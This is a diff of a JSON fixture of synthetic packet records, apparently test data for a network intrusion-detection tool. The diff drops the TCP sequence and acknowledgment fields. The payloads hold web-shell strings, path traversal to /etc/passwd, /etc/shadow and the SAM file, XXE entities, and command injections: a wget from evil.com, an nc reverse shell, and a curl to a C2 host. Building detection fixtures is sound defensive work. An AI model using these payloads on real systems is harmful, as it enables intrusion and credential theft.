-    "flow_id": "192.168.1.77:60001->192.168.1.20:22/TCP",
-    "tcp_seq": 305599802,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60001->192.168.1.20:22/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:23.000",
@@ -1240,9 +1076,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60002->192.168.1.20:23/TCP",
-    "tcp_seq": 163619329,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60002->192.168.1.20:23/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:24.500",
@@ -1255,9 +1089,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60003->192.168.1.20:25/TCP",
-    "tcp_seq": 255651522,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60003->192.168.1.20:25/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:26.000",
@@ -1270,9 +1102,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60004->192.168.1.20:53/TCP",
-    "tcp_seq": 178808795,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60004->192.168.1.20:53/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:27.500",
@@ -1285,9 +1115,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60005->192.168.1.20:80/TCP",
-    "tcp_seq": 27588732,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60005->192.168.1.20:80/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:29.000",
@@ -1300,9 +1128,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60006->192.168.1.20:110/TCP",
-    "tcp_seq": 251051171,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60006->192.168.1.20:110/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:30.500",
@@ -1315,9 +1141,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60007->192.168.1.20:135/TCP",
-    "tcp_seq": 175534438,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60007->192.168.1.20:135/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:32.000",
@@ -1330,9 +1154,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60008->192.168.1.20:139/TCP",
-    "tcp_seq": 324599415,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60008->192.168.1.20:139/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:33.500",
@@ -1345,9 +1167,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60009->192.168.1.20:143/TCP",
-    "tcp_seq": 31925101,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60009->192.168.1.20:143/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:35.000",
@@ -1360,9 +1180,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60010->192.168.1.20:443/TCP",
-    "tcp_seq": 43467295,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60010->192.168.1.20:443/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:36.500",
@@ -1375,9 +1193,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60011->192.168.1.20:445/TCP",
-    "tcp_seq": 88165403,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60011->192.168.1.20:445/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:38.000",
@@ -1390,9 +1206,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60012->192.168.1.20:993/TCP",
-    "tcp_seq": 275000953,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60012->192.168.1.20:993/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:39.500",
@@ -1405,9 +1219,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60013->192.168.1.20:995/TCP",
-    "tcp_seq": 13495662,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60013->192.168.1.20:995/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:41.000",
@@ -1420,9 +1232,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60014->192.168.1.20:1433/TCP",
-    "tcp_seq": 81261801,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60014->192.168.1.20:1433/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:42.500",
@@ -1435,9 +1245,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60015->192.168.1.20:3306/TCP",
-    "tcp_seq": 280453760,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60015->192.168.1.20:3306/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:44.000",
@@ -1450,9 +1258,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60016->192.168.1.20:3389/TCP",
-    "tcp_seq": 340580064,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60016->192.168.1.20:3389/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:45.500",
@@ -1465,9 +1271,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60017->192.168.1.20:5432/TCP",
-    "tcp_seq": 103939883,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60017->192.168.1.20:5432/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:47.000",
@@ -1480,9 +1284,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60018->192.168.1.20:5900/TCP",
-    "tcp_seq": 175048631,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60018->192.168.1.20:5900/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:48.500",
@@ -1495,9 +1297,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60019->192.168.1.20:6379/TCP",
-    "tcp_seq": 27756380,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60019->192.168.1.20:6379/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:50.000",
@@ -1510,9 +1310,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60020->192.168.1.20:8000/TCP",
-    "tcp_seq": 359942794,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60020->192.168.1.20:8000/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:51.500",
@@ -1525,9 +1323,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60021->192.168.1.20:8080/TCP",
-    "tcp_seq": 78684318,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60021->192.168.1.20:8080/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:53.000",
@@ -1540,9 +1336,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60022->192.168.1.20:8443/TCP",
-    "tcp_seq": 303868148,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60022->192.168.1.20:8443/TCP"
   },
   {
     "timestamp": "2026-07-08T10:01:54.500",
@@ -1555,9 +1349,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.77:60023->192.168.1.20:9200/TCP",
-    "tcp_seq": 267970931,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.77:60023->192.168.1.20:9200/TCP"
   },
   {
     "timestamp": "2026-07-08T10:02:00.000",
@@ -1570,9 +1362,7 @@
     "flags": "PA",
     "payload": "\\x16\\x03\\x01\\x00\\x05\\x01\\x00\\x00\\x01\\x03",
     "payload_len": 10,
-    "flow_id": "192.168.1.55:52341->203.0.113.99:443/TCP",
-    "tcp_seq": 251914846,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.55:52341->203.0.113.99:443/TCP"
   },
   {
     "timestamp": "2026-07-08T10:02:05.000",
@@ -1585,9 +1375,7 @@
     "flags": "S",
     "payload": "",
     "payload_len": 0,
-    "flow_id": "192.168.1.55:52342->198.51.100.42:443/TCP",
-    "tcp_seq": 124055468,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.55:52342->198.51.100.42:443/TCP"
   },
   {
     "timestamp": "2026-07-08T10:02:10.000",
@@ -1600,9 +1388,7 @@
     "flags": "PA",
     "payload": "GET /beacon HTTP/1.1",
     "payload_len": 20,
-    "flow_id": "192.168.1.55:52343->203.0.113.55:8080/TCP",
-    "tcp_seq": 397887483,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.55:52343->203.0.113.55:8080/TCP"
   },
   {
     "timestamp": "2026-07-08T10:02:10.000",
@@ -1615,9 +1401,7 @@
     "flags": "PA",
     "payload": "\\x16\\x03\\x01\\x00\\x7f\\x01\\x00\\x00{\\x03\\x03",
     "payload_len": 11,
-    "flow_id": "192.168.1.10:51200->192.168.1.20:443/TCP",
-    "tcp_seq": 140628497,
-    "tcp_ack": 0
+    "flow_id": "192.168.1.10:51200->192.168.1.20:443/TCP"
   },
   {
     "timestamp": "2026-07-08T10:05:00.000",
@@ -1630,9 +1414,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "POST /upload.php HTTP/1.1\r\n\r\ncmd=eval($_POST[cmd]) test",
-    "payload_len": 55,
-    "tcp_seq": 267910400,
-    "tcp_ack": 0
+    "payload_len": 55
   },
   {
     "timestamp": "2026-07-08T10:05:00.050",
@@ -1645,9 +1427,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "POST /shell.php HTTP/1.1\r\n\r\nexec=system($_GET[c]) test",
-    "payload_len": 54,
-    "tcp_seq": 343321954,
-    "tcp_ack": 0
+    "payload_len": 54
   },
   {
     "timestamp": "2026-07-08T10:05:00.100",
@@ -1660,9 +1440,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "POST /admin/editor.php HTTP/1.1\r\n\r\ncheck=assert($_REQUEST[pass]) test",
-    "payload_len": 69,
-    "tcp_seq": 308079384,
-    "tcp_ack": 0
+    "payload_len": 69
   },
   {
     "timestamp": "2026-07-08T10:05:00.150",
@@ -1675,9 +1453,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "GET /images/shell.php?c=cat%20/etc/passwd HTTP/1.1",
-    "payload_len": 50,
-    "tcp_seq": 365688377,
-    "tcp_ack": 0
+    "payload_len": 50
   },
   {
     "timestamp": "2026-07-08T10:05:00.200",
@@ -1690,9 +1466,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "GET /download?file=../../../etc/passwd HTTP/1.1",
-    "payload_len": 47,
-    "tcp_seq": 167035517,
-    "tcp_ack": 0
+    "payload_len": 47
   },
   {
     "timestamp": "2026-07-08T10:05:00.250",
@@ -1705,9 +1479,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "GET /static/..\\..\\..\\windows\\system32\\config\\sam HTTP/1.1",
-    "payload_len": 57,
-    "tcp_seq": 155990109,
-    "tcp_ack": 0
+    "payload_len": 57
   },
   {
     "timestamp": "2026-07-08T10:05:00.300",
@@ -1720,9 +1492,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "GET /files/....//....//....//etc/shadow HTTP/1.1",
-    "payload_len": 48,
-    "tcp_seq": 227638083,
-    "tcp_ack": 0
+    "payload_len": 48
   },
   {
     "timestamp": "2026-07-08T10:05:00.350",
@@ -1735,9 +1505,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "POST /api/export HTTP/1.1\r\n\r\n{\"path\":\"../../../etc/hosts\"}",
-    "payload_len": 58,
-    "tcp_seq": 105070452,
-    "tcp_ack": 0
+    "payload_len": 58
   },
   {
     "timestamp": "2026-07-08T10:05:00.400",
@@ -1750,9 +1518,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "GET /ping?host=8.8.8.8; wget http://evil.com/shell.sh HTTP/1.1",
-    "payload_len": 62,
-    "tcp_seq": 360503410,
-    "tcp_ack": 0
+    "payload_len": 62
   },
   {
     "timestamp": "2026-07-08T10:05:00.450",
@@ -1765,9 +1531,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "GET /trace?ip=127.0.0.1 | nc -e /bin/bash 10.0.0.99 4444 HTTP/1.1",
-    "payload_len": 65,
-    "tcp_seq": 250823997,
-    "tcp_ack": 0
+    "payload_len": 65
   },
   {
     "timestamp": "2026-07-08T10:05:00.500",
@@ -1780,9 +1544,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "POST /exec HTTP/1.1\r\n\r\ncmd=` id`",
-    "payload_len": 32,
-    "tcp_seq": 161592671,
-    "tcp_ack": 0
+    "payload_len": 32
   },
   {
     "timestamp": "2026-07-08T10:05:00.550",
@@ -1795,9 +1557,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "GET /cgi-bin/status?ping=google.com;curl http://c2.server.com/beacon HTTP/1.1",
-    "payload_len": 77,
-    "tcp_seq": 276674513,
-    "tcp_ack": 0
+    "payload_len": 77
   },
   {
     "timestamp": "2026-07-08T10:05:00.600",
@@ -1810,9 +1570,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "POST /api/xml HTTP/1.1\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>",
-    "payload_len": 123,
-    "tcp_seq": 21755803,
-    "tcp_ack": 0
+    "payload_len": 123
   },
   {
     "timestamp": "2026-07-08T10:05:00.650",
@@ -1825,9 +1583,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "POST /soap HTTP/1.1\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://evil.com/evil.dtd\">%dtd;]>",
-    "payload_len": 115,
-    "tcp_seq": 291589239,
-    "tcp_ack": 0
+    "payload_len": 115
   },
   {
     "timestamp": "2026-07-08T10:05:00.700",
@@ -1840,9 +1596,7 @@
     "direction": "request",
     "flags": "PA",
     "payload": "POST /upload HTTP/1.1\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/shadow\">]><user>&ent;</user>",
-    "payload_len": 126,
-    "tcp_seq": 299479089,
-    "tcp_ack": 0
+    "payload_len": 126
   },
   {
     "timestamp": "2026-07-08T10:05:00.750",
@@ -1855,9 +1609,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 176211531,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:00.800",
@@ -1870,9 +1622,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 786302609,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:00.850",
@@ -1885,9 +1635,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 99613618,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:00.900",
@@ -1900,9 +1648,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 615283173,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:00.950",
@@ -1915,9 +1661,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 258537758,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.000",
@@ -1930,9 +1674,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 812246316,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.050",
@@ -1945,9 +1687,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 63427675,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.100",
@@ -1960,9 +1700,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 609528274,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.150",
@@ -1975,9 +1713,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 89631505,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.200",
@@ -1990,9 +1726,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 537980829,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.250",
@@ -2005,9 +1739,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 224413338,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.300",
@@ -2020,9 +1752,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 893437923,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.350",
@@ -2035,9 +1765,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 116990035,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.400",
@@ -2050,9 +1778,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 695093672,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.450",
@@ -2065,9 +1791,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 238293381,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.500",
@@ -2080,9 +1804,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 544774616,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.550",
@@ -2095,9 +1817,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 168375048,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.600",
@@ -2110,9 +1830,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 867820286,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.650",
@@ -2125,9 +1843,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 329227496,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.700",
@@ -2140,9 +1856,7 @@
     "direction": "response",
     "flags": "RA",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 636825577,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.750",
@@ -2155,9 +1869,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 253884637,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.800",
@@ -2170,9 +1882,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 60801183,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.850",
@@ -2185,9 +1895,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 305956640,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.900",
@@ -2200,9 +1908,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 24661896,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:01.950",
@@ -2215,9 +1921,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 192925521,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.000",
@@ -2230,9 +1934,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 255575016,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.050",
@@ -2245,9 +1947,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 308966416,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.100",
@@ -2260,9 +1960,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 395931175,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.150",
@@ -2275,9 +1973,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 182442441,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.200",
@@ -2290,9 +1986,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 340574251,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.250",
@@ -2305,9 +1999,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 298336047,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.300",
@@ -2320,9 +2012,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 373913433,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.350",
@@ -2335,9 +2025,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 115623484,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.400",
@@ -2350,9 +2038,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 339355244,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.450",
@@ -2365,9 +2051,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 394482888,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.500",
@@ -2380,9 +2064,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 234192658,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.550",
@@ -2395,9 +2077,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 249418064,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.600",
@@ -2410,9 +2090,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 205609472,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.650",
@@ -2425,9 +2103,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 303028374,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.700",
@@ -2440,9 +2116,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 355831876,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.750",
@@ -2455,9 +2129,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 392218349,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.800",
@@ -2470,9 +2142,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 164365689,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.850",
@@ -2485,9 +2155,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 139496432,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.900",
@@ -2500,9 +2168,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 209397062,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:02.950",
@@ -2515,9 +2181,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 293435404,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.000",
@@ -2530,9 +2194,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 260784555,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.050",
@@ -2545,9 +2207,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 382198031,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.100",
@@ -2560,9 +2220,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 236061840,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.150",
@@ -2575,9 +2233,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 88789701,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.200",
@@ -2590,9 +2246,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 367083391,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.250",
@@ -2605,9 +2259,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 59808444,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.300",
@@ -2620,9 +2272,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 108277258,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.350",
@@ -2635,9 +2285,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 38122167,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.400",
@@ -2650,9 +2298,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 85562683,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.450",
@@ -2665,9 +2311,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 92937523,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.500",
@@ -2680,9 +2324,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 266634783,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.550",
@@ -2695,9 +2337,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 395139445,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.600",
@@ -2710,9 +2350,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 88363554,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.650",
@@ -2725,9 +2363,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 128177047,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.700",
@@ -2740,9 +2376,7 @@
     "direction": "request",
     "flags": "S",
     "payload": "",
-    "payload_len": 0,
-    "tcp_seq": 199417441,
-    "tcp_ack": 0
+    "payload_len": 0
   },
   {
     "timestamp": "2026-07-08T10:05:03.750",
@@ -2755,9 +2389,7 @@
     "direction": "request",
